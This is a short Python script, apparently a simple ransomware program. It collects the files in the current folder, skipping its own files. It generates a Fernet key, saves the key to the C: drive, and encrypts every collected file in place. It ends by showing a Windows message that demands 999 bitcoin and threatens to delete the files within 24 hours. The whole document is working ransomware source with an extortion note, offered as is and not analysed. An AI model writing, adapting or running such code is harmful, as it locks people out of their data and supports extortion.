# import modules
import os
from cryptography.fernet import Fernet


# files list
files = []


# bypass yourself 
for file in os.listdir():
	if file == "crypter.py" or file == "thekey.key" or file == "decrypter.py" or file == "desktop.ini":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)




# Specify the full path to the file on the D drive
file_pathk = os.path.join("C:", "thekey.key")

# generate key
key = Fernet.generate_key()

with open(file_pathk, "wb") as thekey:
	thekey.write(key)



# cryptogrophy
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	
	try:
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)
	except:
		print("can't encrypt one file!", file)

os.system("msg * All of your files have been encrypted! send me 999 bitcoin or I'll delete them in 24 hour")




